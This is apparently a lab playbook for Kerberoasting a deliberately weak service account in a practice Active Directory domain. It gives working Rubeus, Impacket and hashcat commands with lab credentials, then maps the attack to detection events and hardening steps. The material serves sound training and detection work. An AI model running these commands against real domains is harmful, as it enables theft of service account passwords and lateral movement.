# Attack 02 — Kerberoasting `svc_sql`

**ATT&CK:** Credential Access — Steal or Forge Kerberos Tickets: Kerberoasting (T1558.003)
**Goal:** As `j.rodriguez` (no admin rights), request a service ticket for the SPN account, extract its RC4 hash, and crack it offline — recovering the service account's plaintext password.
**Why it works here:** `svc_sql` has an SPN + a short human password + RC4 allowed (`INTENTIONALLY-VULNERABLE.md` #1). Any authenticated user may request a TGS for any SPN; if the ticket is RC4-encrypted, it's encrypted with a key derived from the *service account's password* — weak password = crackable ticket.

---

## Steps

### Option A — Rubeus (from WS01)

```powershell
# List roastable accounts first
.\Rubeus.exe kerberoast /stats

# Roast svc_sql and write the hash for hashcat
.\Rubeus.exe kerberoast /user:svc_sql /format:hashcat /outfile:C:\Lab\loot\svc_sql.hash
```

### Option B — Impacket (from KALI)

```bash
GetUserSPNs.py -request -dc-ip 192.168.56.10 lab.local/j.rodriguez:'LabUser!2026' -outputfile svc_sql.hash
```

### Crack offline (on KALI — never against the DC)

```bash
# hashcat mode 13100 = Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
hashcat -m 13100 svc_sql.hash /usr/share/wordlists/rockyou.txt
# Expected lab result:  $krb5tgs$23$*svc_sql...  ->  LabSvc!2026
```

Recovering `LabSvc!2026` proves the full chain: authenticated user → service ticket → **domain service account credentials**, usable for lateral movement to anything `svc_sql` can access.

## Logs / Event IDs generated (feed `detections/01-kerberoasting.md`)

| Source | Event | Key fields |
|---|---|---|
| DC01 Security | **4769** (Kerberos service ticket requested) | `ServiceName = svc_sql`, **`TicketEncryptionType = 0x17`** (RC4 — the smoking gun; AES is `0x11`/`0x12`), `ClientAddress` = WS01/KALI |
| DC01 Security | **4770/4771** (context) | Ticket renewal / pre-auth events around the same window |
| WS01 Sysmon | **1** | `Rubeus.exe` process creation (if run there) |
| KALI | — (attacker side) | Hash cracking is **offline and invisible** to the domain — which is why detection must happen at ticket *request* time (4769), not at crack time |

> Key analyst insight: you cannot detect the crack. You detect the **roast**: 4769 events with RC4 downgrade, one account requesting tickets for many SPNs, or any ticket request for a honey/critical SPN. After `hardening/`, `svc_sql` becomes a gMSA with AES-only tickets — re-run this playbook and show it failing.

## Cleanup
Record: target SPN, encryption type observed, time-to-crack, and the recovered password's weakness class (short + wordlist pattern) for `findings/sample-findings-report.md`. Snapshot `post-kerberoast`.
